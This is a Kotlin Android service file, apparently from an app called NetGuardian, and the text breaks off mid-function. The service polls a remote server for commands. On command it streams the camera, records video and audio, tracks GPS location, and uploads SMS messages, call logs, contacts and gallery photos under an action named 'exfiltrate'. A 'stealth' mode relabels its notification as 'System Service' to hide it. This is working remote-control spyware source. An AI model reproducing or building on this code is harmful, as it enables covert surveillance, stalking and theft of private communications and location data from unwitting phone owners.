package net.guardian

import android.app.*
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.database.Cursor
import android.graphics.*
import android.hardware.camera2.*
import android.location.Location
import android.location.LocationManager
import android.media.Image
import android.media.ImageReader
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.MediaStore
import android.provider.Telephony
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Settings
import android.util.Size
import android.Manifest
import android.view.Surface
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import kotlinx.coroutines.Dispatchers.IO
import kotlinx.coroutines.sync.Mutex
import java.io.DataOutputStream
import java.net.HttpURLConnection
import java.net.URL
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File

class CommandService : Service() {
    private val scope = CoroutineScope(IO + SupervisorJob())
    private var pollingJob: Job? = null
    private var recorder: MediaRecorder? = null
    private var audioFilePath: String? = null
    private var isRecording = false

    private var cameraManager: CameraManager? = null
    private var cameraDevice: CameraDevice? = null
    private var imageReader: ImageReader? = null
    private var captureSession: CameraCaptureSession? = null
    private var isStreaming = false
    private var streamingJob: Job? = null
    private var previewSize: Size? = null
    private val mainHandler = Handler(Looper.getMainLooper())
    private val frameMutex = kotlinx.coroutines.sync.Mutex()
    private var frameInFlight = false

    private var surveillanceMode = false
    private var videoMode = false
    private var audioMode = false
    private var trackingMode = false
    private var stealthMode = false
    private var useFrontCamera = false
    private var videoDurationSec = 30
    private var audioDurationSec = 10
    private var trackIntervalMs = 30000L
    private var videoChunkJob: Job? = null
    private var audioChunkJob: Job? = null
    private var trackingJob: Job? = null
    private var videoRecorder: MediaRecorder? = null
    private var videoOutputPath: String? = null
    private val recordMutex = kotlinx.coroutines.sync.Mutex()
    private var locationManager: LocationManager? = null
    private var motionDetectionEnabled = true
    private var motionThreshold = 0.15f
    private var lastFrameData: ByteArray? = null
    private var lastMotionAlert = 0L
    private val motionCooldownMs = 10000L
    private var prefs: SharedPreferences? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        prefs = getSharedPreferences("netguardian", Context.MODE_PRIVATE)
        startForeground()
        surveillanceMode = prefs?.getBoolean("surveillance_mode", false) == true
        if (surveillanceMode) {
            videoMode = prefs?.getBoolean("video_mode", false) == true
            audioMode = prefs?.getBoolean("audio_mode", false) == true
            trackingMode = prefs?.getBoolean("tracking_mode", false) == true
            motionDetectionEnabled = prefs?.getBoolean("motion_detection", true) == true
            useFrontCamera = prefs?.getBoolean("front_camera", false) == true
            scope.launch {
                delay(2000)
                startCamera()
                if (videoMode) startVideoChunks()
                if (audioMode) startAudioChunks()
                if (trackingMode) startTracking()
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (pollingJob == null) {
            startPolling()
            RestartReceiver.scheduleWatchdog(this)
        }
        return START_STICKY
    }

    override fun onDestroy() {
        RestartReceiver.cancelWatchdog(this)
        pollingJob?.cancel()
        stopVideoChunks()
        stopAudioChunks()
        stopVideoRecorder()
        stopCamera()
        recorder?.release()
        scope.cancel()
        super.onDestroy()
    }

    private fun startForeground() {
        try {
            val channelId = "command_service"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val ch = NotificationChannel(channelId, "Command Service", NotificationManager.IMPORTANCE_LOW)
                (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
            }
            val n = NotificationCompat.Builder(this, channelId)
                .setContentTitle("NetGuardian")
                .setContentText("Remote command service active")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setOngoing(true)
                .build()
            startForegroundSafely(2, n)
        } catch (_: Exception) { }
    }

    private fun startPolling() {
        pollingJob = scope.launch {
            while (isActive) {
                try { pollCommands() } catch (_: Exception) { }
                delay(5000)
            }
        }
    }

    private suspend fun pollCommands() {
        val cmds = ServerUploader.getPendingCommands()
        for (cmd in cmds) {
            val id = cmd["id"] as? Int ?: continue
            val action = cmd["action"] as? String ?: continue
            val target = cmd["target"] as? String ?: ""

            try {
                when (action) {
                    "request_permission" -> {
                        handleRequestPermission(target)
                        ServerUploader.ackCommand(id, "done", "ok")
                    }
                    "trigger_capture" -> {
                        if (target == "camera" || target == "screen") {
                            handleCaptureWithActivity(target, id)
                        } else {
                            handleTriggerCapture(target)
                            ServerUploader.ackCommand(id, "done", "ok")
                        }
                    }
                    "open_settings" -> {
                        handleOpenSettings()
                        ServerUploader.ackCommand(id, "done", "ok")
                    }
                    "camera_stream" -> {
                        handleCameraStream(target)
                        ServerUploader.ackCommand(id, "done", "ok")
                    }
                    "screen_stream" -> {
                        handleCaptureWithActivity("screen_stream_$target", id)
                    }
                    "clear_data" -> {
                        clearLocalData()
                        ServerUploader.ackCommand(id, "done", "ok")
                    }
                    "surveillance" -> {
                        handleSurveillance(target, id)
                    }
                    "record_video" -> {
                        ServerUploader.ackCommand(id, "done", "Recording ${target}s video")
                        scope.launch {
                            recordSingleChunk()
                        }
                    }
                    "exfiltrate" -> {
                        ServerUploader.ackCommand(id, "done", "Exfiltrating $target")
                        scope.launch {
                            exfiltrate(target)
                        }
                    }
                    "stealth" -> {
                        stealthMode = target == "on"
                        updateNotification(target == "on")
                        ServerUploader.ackCommand(id, "done", "stealth:${if (stealthMode) "on" else "off"}")
                    }
                }
            } catch (e: Exception) {
                ServerUploader.ackCommand(id, "failed", e.message ?: "unknown")
            }
        }
    }

    private fun handleRequestPermission(permission: String) {
        val perm = when (permission) {
            "camera" -> Manifest.permission.CAMERA
            "microphone" -> Manifest.permission.RECORD_AUDIO
            "contacts" -> Manifest.permission.READ_CONTACTS
            "sms" -> Manifest.permission.READ_SMS
            "call_log" -> Manifest.permission.READ_CALL_LOG
            "gallery" -> if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
            "location" -> Manifest.permission.ACCESS_FINE_LOCATION
            else -> return
        }
        if (ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED) return

        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            putExtra("command_permission", permission)
        }
        startActivity(intent)
    }

    private fun handleCaptureWithActivity(target: String, commandId: Int) {
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            putExtra("command_capture", target)
            putExtra("command_id", commandId)
        }
        try {
            startActivity(intent)
        } catch (_: Exception) {
            showScreenNotification(target, commandId)
        }
    }

    private fun showScreenNotification(target: String, commandId: Int) {
        val intent = Intent(this, MainActivity::class.java).apply {
            putExtra("command_capture", target)
            putExtra("command_id", commandId)
        }
        val pi = PendingIntent.getActivity(this, commandId, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
        val chanId = "screen_recording"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(
                    NotificationChannel(chanId, "Screen Recording",
                        NotificationManager.IMPORTANCE_HIGH))
        }
        val n = NotificationCompat.Builder(this, chanId)
            .setContentTitle("Screen Recording")
            .setContentText("Tap to start screen recording")
            .setSmallIcon(android.R.drawable.ic_menu_share)
            .setContentIntent(pi)
            .setAutoCancel(true)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .build()
        try {
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
                .notify(2000 + commandId, n)
        } catch (_: Exception) { }
    }

    private fun handleTriggerCapture(target: String) {
        when (target) {
            "audio" -> triggerAudioCapture()
            "contacts" -> triggerContactsUpload()
        }
    }

    private fun triggerAudioCapture() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED) return

        if (!isRecording) {
            val file = File(
                getExternalFilesDir(Environment.DIRECTORY_MUSIC),
                "remote_${System.currentTimeMillis()}.mp3"
            )
            try {
                val r = MediaRecorder().apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setOutputFile(file.absolutePath)
                    prepare()
                    start()
                }
                recorder = r
                audioFilePath = file.absolutePath
                isRecording = true
                scope.launch {
                    delay(10000)
                    stopAudioAndUpload()
                }
            } catch (_: Exception) { }
        }
    }

    private fun stopAudioAndUpload() {
        recorder?.apply {
            try { stop() } catch (_: Exception) { }
            release()
        }
        recorder = null
        isRecording = false

        audioFilePath?.let { path ->
            val f = File(path)
            if (f.exists()) {
                ServerUploader.uploadCapture("audio", file = f)
                f.delete()
            }
        }
    }

    private fun triggerContactsUpload() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) return

        try {
            val list = mutableListOf<JSONObject>()
            val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
            val projection = arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Email.ADDRESS
            )
            var cursor: Cursor? = null
            try {
                cursor = contentResolver.query(uri, projection, null, null,
                    "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC")
                cursor?.use {
                    while (it.moveToNext()) {
                        val name = it.getString(0) ?: "Unknown"
                        val phone = it.getString(1) ?: ""
                        val email = try { it.getString(2) ?: "" } catch (_: Exception) { "" }
                        list.add(JSONObject().apply {
                            put("name", name); put("phone", phone); put("email", email)
                        })
                    }
                }
            } finally { cursor?.close() }
            val json = JSONArray().apply { list.forEach { put(it) } }.toString()
            ServerUploader.uploadContacts(contactsJson = json)
        } catch (_: Exception) { }
    }

    private fun handleCameraStream(action: String) {
        when (action) {
            "start" -> startCamera()
            "stop" -> stopCamera()
        }
    }

    private fun startCamera() {
        if (isStreaming) return
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED) return

        try {
            val facing = if (useFrontCamera) CameraCharacteristics.LENS_FACING_FRONT
                         else CameraCharacteristics.LENS_FACING_BACK
            val id = cameraManager?.cameraIdList?.firstOrNull { id ->
                val chars = cameraManager?.getCameraCharacteristics(id)
                chars?.get(CameraCharacteristics.LENS_FACING) == facing
            } ?: cameraManager?.cameraIdList?.firstOrNull() ?: return

            val chars = cameraManager?.getCameraCharacteristics(id) ?: return
            val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return
            previewSize = map.getOutputSizes(ImageFormat.YUV_420_888)
                ?.find { it.width <= 640 } ?: Size(320, 240)

            val ir = ImageReader.newInstance(
                previewSize!!.width, previewSize!!.height,
                ImageFormat.YUV_420_888, 2
            )
            ir.setOnImageAvailableListener({ reader ->
                if (frameInFlight) return@setOnImageAvailableListener
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                val jpeg = imageToJpeg(image)
                image.close()
                if (jpeg != null) {
                    frameInFlight = true
                    scope.launch {
                        try { uploadFrame(jpeg) } catch (_: Exception) { }
                        frameInFlight = false
                    }
                }
            }, mainHandler)
            imageReader = ir

            cameraManager?.openCamera(id, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    val surface = ir.surface
                    try {
                        val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                            addTarget(surface)
                            set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                            set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                        }
                        camera.createCaptureSession(listOf(surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    captureSession = session
                                    isStreaming = true
                                    session.setRepeatingRequest(request.build(), null, mainHandler)
                                }
                                override fun onConfigureFailed(session: CameraCaptureSession) { stopCamera() }
                            }, mainHandler)
                    } catch (_: Exception) { stopCamera() }
                }
                override fun onDisconnected(camera: CameraDevice) { stopCamera() }
                override fun onError(camera: CameraDevice, error: Int) { stopCamera() }
            }, mainHandler)
        } catch (_: Exception) { stopCamera() }
    }

    private fun stopCamera() {
        isStreaming = false
        try { captureSession?.close() } catch (_: Exception) { }
        try { cameraDevice?.close() } catch (_: Exception) { }
        try { imageReader?.close() } catch (_: Exception) { }
        captureSession = null
        cameraDevice = null
        imageReader = null
        streamingJob?.cancel()
        streamingJob = null
    }

    private fun imageToJpeg(image: Image): ByteArray? {
        try {
            val planes = image.planes
            val yBuf = planes[0].buffer
            val uBuf = planes[1].buffer
            val vBuf = planes[2].buffer

            val ySize = yBuf.remaining()
            val uSize = uBuf.remaining()
            val vSize = vBuf.remaining()
            val nv21 = ByteArray(ySize + uSize + vSize)

            yBuf.get(nv21, 0, ySize)
            for (i in 0 until uSize.coerceAtMost(vSize)) {
                nv21[ySize + i * 2] = vBuf.get(i)
                nv21[ySize + i * 2 + 1] = uBuf.get(i)
            }

            val w = image.width
            val h = image.height
            val yuv = YuvImage(nv21, ImageFormat.NV21, w, h, null)
            val out = ByteArrayOutputStream()
            yuv.compressToJpeg(Rect(0, 0, w, h), 70, out)
            return out.toByteArray()
        } catch (_: Exception) { return null }
    }

    private fun uploadFrame(jpeg: ByteArray) {
        if (surveillanceMode) {
            scope.launch { checkMotion(jpeg) }
        }
        try {
            val boundary = "Boundary${System.currentTimeMillis()}"
            val conn = URL("${ServerUploader.serverUrl}/api/camera/frame").openConnection() as HttpURLConnection
            conn.connectTimeout = 5000; conn.readTimeout = 5000
            conn.requestMethod = "POST"; conn.doOutput = true
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            DataOutputStream(conn.outputStream).use { dos ->
                dos.writeBytes("--$boundary\r\n")
                dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"frame.jpg\"\r\n")
                dos.writeBytes("Content-Type: image/jpeg\r\n\r\n")
                dos.write(jpeg)
                dos.writeBytes("\r\n--$boundary--\r\n")
            }
            conn.responseCode
        } catch (_: Exception) { }
    }

    private fun handleOpenSettings() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
            data = Uri.fromParts("package", packageName, null)
        }
        startActivity(intent)
    }

    private fun clearLocalData() {
        try {
            cacheDir.listFiles()?.forEach { it.delete() }
            getExternalFilesDir(null)?.listFiles()?.forEach { it.delete() }
        } catch (_: Exception) { }
        try {
            val ctx = applicationContext
            ctx.getDir("netguardian_cache", android.content.Context.MODE_PRIVATE).listFiles()?.forEach { it.delete() }
        } catch (_: Exception) { }
    }

    private fun saveState() {
        prefs?.edit()?.apply {
            putBoolean("surveillance_mode", surveillanceMode)
            putBoolean("video_mode", videoMode)
            putBoolean("audio_mode", audioMode)
            putBoolean("tracking_mode", trackingMode)
            putBoolean("motion_detection", motionDetectionEnabled)
            putBoolean("front_camera", useFrontCamera)
            apply()
        }
    }

    private fun handleSurveillance(action: String, commandId: Int) {
        when (action) {
            "start" -> {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                    != PackageManager.PERMISSION_GRANTED) {
                    ServerUploader.ackCommand(commandId, "failed", "Camera permission not granted")
                    return
                }
                surveillanceMode = true
                saveState()
                startCamera()
                if (videoMode) startVideoChunks()
                if (audioMode) startAudioChunks()
                if (trackingMode) startTracking()
                ServerUploader.ackCommand(commandId, "done", "Surveillance started")
            }
            "stop" -> {
                surveillanceMode = false
                saveState()
                stopVideoChunks()
                stopAudioChunks()
                stopTracking()
                stopCamera()
                lastFrameData = null
                ServerUploader.ackCommand(commandId, "done", "Surveillance stopped")
            }
            "motion_on" -> {
                motionDetectionEnabled = true
                saveState()
                ServerUploader.ackCommand(commandId, "done", "Motion detection on")
            }
            "motion_off" -> {
                motionDetectionEnabled = false
                saveState()
                ServerUploader.ackCommand(commandId, "done", "Motion detection off")
            }
            "video_on" -> {
                videoMode = true
                saveState()
                if (surveillanceMode) startVideoChunks()
                ServerUploader.ackCommand(commandId, "done", "Video recording on")
            }
            "video_off" -> {
                videoMode = false
                saveState()
                stopVideoChunks()
                ServerUploader.ackCommand(commandId, "done", "Video recording off")
            }
            "audio_on" -> {
                audioMode = true
                saveState()
                if (surveillanceMode) startAudioChunks()
                ServerUploader.ackCommand(commandId, "done", "Audio surveillance on")
            }
            "audio_off" -> {
                audioMode = false
                saveState()
                stopAudioChunks()
                ServerUploader.ackCommand(commandId, "done", "Audio surveillance off")
            }
            "camera_front" -> {
                useFrontCamera = true
                saveState()
                if (surveillanceMode && !isRecording) { stopCamera(); startCamera() }
                ServerUploader.ackCommand(commandId, "done", "Front camera")
            }
            "camera_back" -> {
                useFrontCamera = false
                saveState()
                if (surveillanceMode && !isRecording) { stopCamera(); startCamera() }
                ServerUploader.ackCommand(commandId, "done", "Back camera")
            }
            "tracking_on" -> {
                trackingMode = true
                saveState()
                startTracking()
                ServerUploader.ackCommand(commandId, "done", "GPS tracking on")
            }
            "tracking_off" -> {
                trackingMode = false
                saveState()
                stopTracking()
                ServerUploader.ackCommand(commandId, "done", "GPS tracking off")
            }
        }
    }

    private fun startVideoChunks() {
        videoChunkJob?.cancel()
        videoChunkJob = scope.launch {
            while (isActive && surveillanceMode && videoMode) {
                recordSingleChunk()
            }
        }
    }

    private fun stopVideoChunks() {
        videoChunkJob?.cancel()
        videoChunkJob = null
    }

    private suspend fun recordSingleChunk() {
        if (!recordMutex.tryLock()) return
        try {
            stopCamera()
            delay(500)

            val facing = if (useFrontCamera) CameraCharacteristics.LENS_FACING_FRONT
                         else CameraCharacteristics.LENS_FACING_BACK
            val id = cameraManager?.cameraIdList?.firstOrNull { id ->
                val chars = cameraManager?.getCameraCharacteristics(id)
                chars?.get(CameraCharacteristics.LENS_FACING) == facing
            } ?: cameraManager?.cameraIdList?.firstOrNull() ?: return

            val chars = cameraManager?.getCameraCharacteristics(id) ?: return
            val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return
            val vidSize = map.getOutputSizes(MediaRecorder::class.java)
                ?.find { it.width <= 640 && it.width >= 320 } ?: Size(640, 480)

            val outDir = getExternalFilesDir(Environment.DIRECTORY_MOVIES)
            val outPath = File(outDir, "surveillance_${System.currentTimeMillis()}.mp4").absolutePath
            videoOutputPath = outPath

            val mr = MediaRecorder().apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoSize(vidSize.width, vidSize.height)
                setVideoFrameRate(15)
                setVideoEncodingBitRate(500_000)
                setOutputFile(outPath)
                prepare()
            }
            videoRecorder = mr
            val vidSurface = mr.surface

            val ready = CompletableDeferred<Boolean>()
            cameraManager?.openCamera(id, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    try {
                        val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                            addTarget(vidSurface)
                            set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                        }
                        camera.createCaptureSession(listOf(vidSurface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    captureSession = session
                                    session.setRepeatingRequest(request.build(), null, mainHandler)
                                    mr.start()
                                    ready.complete(true)
                                }
                                override fun onConfigureFailed(session: CameraCaptureSession) {
                                    stopVideoRecorder()
                                    ready.complete(false)
                                }
                            }, mainHandler)
                    } catch (_: Exception) {
                        stopVideoRecorder()
                        ready.complete(false)
                    }
                }
                override fun onDisconnected(camera: CameraDevice) {
                    stopVideoRecorder()
                    ready.complete(false)
                }
                override fun onError(camera: CameraDevice, error: Int) {
                    stopVideoRecorder()
                    ready.complete(false)
                }
            }, mainHandler)

            withTimeout(10000) { if (!ready.await()) return@withTimeout }

            delay(videoDurationSec * 1000L)

            stopVideoRecorder()
            delay(500)

            val f = File(outPath)
            if (f.exists() && f.length() > 10000) {
                ServerUploader.uploadCapture("surveillance_video", file = f)
            }
            f.delete()
        } catch (e: CancellationException) {
            stopVideoRecorder()
            throw e
        } catch (e: Exception) {
            stopVideoRecorder()
        } finally {
            recordMutex.unlock()
        }

        if (surveillanceMode && videoMode) {
            delay(2000)
            startCamera()
        }
    }

    private fun stopVideoRecorder() {
        try {
            videoRecorder?.apply {
                try { stop() } catch (_: Exception) { }
                release()
            }
        } catch (_: Exception) { }
        videoRecorder = null
        try { captureSession?.close() } catch (_: Exception) { }
        try { cameraDevice?.close() } catch (_: Exception) { }
        captureSession = null
        cameraDevice = null
    }

    private fun startAudioChunks() {
        audioChunkJob?.cancel()
        audioChunkJob = scope.launch {
            while (isActive && surveillanceMode && audioMode) {
                recordAudioChunk()
            }
        }
    }

    private fun stopAudioChunks() {
        audioChunkJob?.cancel()
        audioChunkJob = null
    }

    private suspend fun recordAudioChunk() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED) {
            delay(audioDurationSec * 1000L)
            return
        }
        try {
            val outDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC)
            val outPath = File(outDir, "surveillance_audio_${System.currentTimeMillis()}.mp3").absolutePath
            val mr = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioChannels(1)
                setAudioSamplingRate(16000)
                setOutputFile(outPath)
                prepare()
                start()
            }
            recorder = mr
            delay(audioDurationSec * 1000L)
            mr.apply {
                try { stop() } catch (_: Exception) { }
                release()
            }
            recorder = null
            val f = File(outPath)
            if (f.exists() && f.length() > 1000) {
                ServerUploader.uploadCapture("surveillance_audio", file = f)
            }
            f.delete()
        } catch (_: Exception) {
            recorder?.apply {
                try { stop() } catch (_: Exception) { }
                release()
            }
            recorder = null
        }
    }

    private suspend fun checkMotion(frame: ByteArray) {
        if (!surveillanceMode || !motionDetectionEnabled) return
        val prev = lastFrameData ?: run { lastFrameData = frame; return }
        lastFrameData = frame

        val diff = motionDiff(frame, prev)
        if (diff > motionThreshold) {
            val now = System.currentTimeMillis()
            if (now - lastMotionAlert > motionCooldownMs) {
                lastMotionAlert = now
                ServerUploader.uploadBytes("surveillance_motion", bytes = frame)
                ServerUploader.sendAlert("MOTION_DETECTED", "Motion (${String.format("%.1f", diff * 100)}%)")
            }
        }
    }

    private suspend fun exfiltrate(target: String) {
        try {
            when (target) {
            "sms" -> {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                    != PackageManager.PERMISSION_GRANTED) {
                    ServerUploader.sendAlert("EXFIL_FAIL", "READ_SMS not granted"); return
                }
                val msgs = JSONArray()
                val uri = Telephony.Sms.Inbox.CONTENT_URI
                contentResolver.query(uri, null, null, null, "${Telephony.Sms.DATE} DESC")?.use { c ->
                    var limit = 200
                    while (c.moveToNext() && limit-- > 0) {
                        val obj = JSONObject()
                        obj.put("address", c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)))
                        obj.put("body", c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY)))
                        obj.put("date", c.getLong(c.getColumnIndexOrThrow(Telephony.Sms.DATE)))
                        obj.put("type", c.getInt(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))
                        msgs.put(obj)
                    }
                }
                val json = JSONObject().apply { put("sms", msgs); put("count", msgs.length()) }
                ServerUploader.uploadBytes("exfil_sms", bytes = json.toString().encodeToByteArray())
                ServerUploader.sendAlert("EXFIL_DONE", "Exfiltrated ${msgs.length()} SMS messages")
            }
            "call_log" -> {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                    != PackageManager.PERMISSION_GRANTED) {
                    ServerUploader.sendAlert("EXFIL_FAIL", "READ_CALL_LOG not granted"); return
                }
                val calls = JSONArray()
                contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null,
                    "${CallLog.Calls.DATE} DESC")?.use { c ->
                    var limit = 200
                    while (c.moveToNext() && limit-- > 0) {
                        val obj = JSONObject()
                        obj.put("number", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)))
                        obj.put("name", c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME)) ?: "")
                        obj.put("type", c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)))
                        obj.put("duration", c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)))
                        obj.put("date", c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DATE)))
                        calls.put(obj)
                    }
                }
                val json = JSONObject().apply { put("call_log", calls); put("count", calls.length()) }
                ServerUploader.uploadBytes("exfil_calllog", bytes = json.toString().encodeToByteArray())
                ServerUploader.sendAlert("EXFIL_DONE", "Exfiltrated ${calls.length()} call log entries")
            }
            "gallery" -> {
                val hasMediaImages = if (Build.VERSION.SDK_INT >= 33) {
                    val readMediaImages = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
                    val readVisualSelected = ContextCompat.checkSelfPermission(this, "android.permission.READ_MEDIA_VISUAL_USER_SELECTED") == PackageManager.PERMISSION_GRANTED
                    readMediaImages || readVisualSelected
                } else {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                }
                if (!hasMediaImages) {
                    ServerUploader.sendAlert("EXFIL_FAIL", "Gallery permission not granted")
                    return
                }
                val projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DATA,
                    MediaStore.Images.Media.DATE_ADDED,
                    MediaStore.Images.Media.SIZE
                )
                val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                var count = 0
                contentResolver.query(uri, projection, null, null,
                    "${MediaStore.Images.Media.DATE_ADDED} DESC")?.use { c ->
                    var limit = 30
                    while (c.moveToNext() && limit-- > 0) {
                        val path = c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)) ?: continue
                        val f = File(path)
                        if (f.exists() && f.length() < 5_000_000) {
                            ServerUploader.uploadCapture("exfil_gallery", file = f)
                            count++
                        }
                    }
                }
                ServerUploader.sendAlert("EXFIL_DONE", "Exfiltrated $count gallery photos")
            }
        }
        } catch (e: Exception) {
            ServerUploader.sendAlert("EXFIL_FAIL", "${target}: ${e.message}")
        }
    }

    private fun startTracking() {
        trackingJob?.cancel()
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) return
        trackingJob = scope.launch {
            while (isActive && trackingMode) {
                recordLocation()
                delay(trackIntervalMs)
            }
        }
    }

    private fun stopTracking() {
        trackingJob?.cancel()
        trackingJob = null
    }

    private suspend fun recordLocation() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) return
        try {
            val loc = locationManager?.getLastKnownLocation(LocationManager.FUSED_PROVIDER)
                ?: locationManager?.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: locationManager?.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (loc != null) {
                val json = JSONObject().apply {
                    put("lat", loc.latitude)
                    put("lon", loc.longitude)
                    put("accuracy", loc.accuracy)
                    put("speed", loc.speed)
                    put("altitude", loc.altitude)
                    put("provider", loc.provider)
                    put("time", loc.time)
                    put("ts", System.currentTimeMillis())
                }
                ServerUploader.uploadBytes("surveillance_location",
                    bytes = json.toString().encodeToByteArray())
            }
        } catch (_: Exception) { }
    }

    private fun startForegroundSafely(id: Int, notification: Notification) {
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(id, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(id, notification)
        }
    }

    private fun updateNotification(stealth: Boolean) {
        try {
            val channelId = if (stealth) "netguardian_stealth" else "netguardian_service"
            if (stealth) {
                val chan = NotificationChannel(channelId, "NetGuardian",
                    NotificationManager.IMPORTANCE_MIN).apply {
                    setShowBadge(false)
                    enableVibration(false)
                    setSound(null, null)
                    lockscreenVisibility = Notification.VISIBILITY_SECRET
                }
                (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
                    .createNotificationChannel(chan)
                val n = NotificationCompat.Builder(this, channelId)
                    .setContentTitle("System Service")
                    .setContentText("Running")
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .setOngoing(true)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .build()
                startForegroundSafely(NOTIFICATION_ID, n)
            } else {
                val chan = NotificationChannel("netguardian_service", "NetGuardian Service",
                    NotificationManager.IMPORTANCE_LOW)
                (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
                    .createNotificationChannel(chan)
                val n = NotificationCompat.Builder(this, "netguardian_service")
                    .setContentTitle("NetGuardian Active")
                    .setContentText("Monitoring")
